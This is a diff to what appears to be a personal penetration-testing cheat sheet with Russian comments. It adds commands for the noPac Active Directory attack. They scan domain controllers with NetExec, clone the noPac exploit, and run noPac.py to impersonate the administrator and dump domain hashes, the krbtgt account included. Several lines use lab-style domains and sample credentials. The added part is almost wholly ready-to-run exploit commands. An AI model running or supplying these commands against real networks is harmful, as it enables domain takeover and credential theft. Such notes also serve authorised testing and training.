@@ -89,6 +89,8 @@
 
 		(квота машин в домене)	nxc ldap dc1.corp.com -u 'user' -p 'passs' -k --use-kcache -M maq	
 
+		(проверяем нопак)	netexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac
+		
 		(LDAP Relay и подписи)	nxc ldap dc1.corp.com -u 'user' -p 'passs' -k --use-kcache -M ldap-checker		
 
 		(атака Pre2k)	nxc ldap dc_control.do.com -u 'comp' -k --use-kcache -M pre2k		
@@ -1540,3 +1542,14 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 	
 # Перебор пользователей через ssh
 	scanner/ssh/ssh_enumusers
+# NoPac
+	git clone https://github.com/Ridter/noPac.git
+	netexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ -проверяем машина квота
+	netexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac  - проверяем нопак
+	
+	python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap  ---- - проверяем нопак
+	
+	python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump   --- дампим все
+	python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump -just-dc-user cgdomain/krbtgt		--- дампим krbtgt
+
+	python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator   --- дампим админ
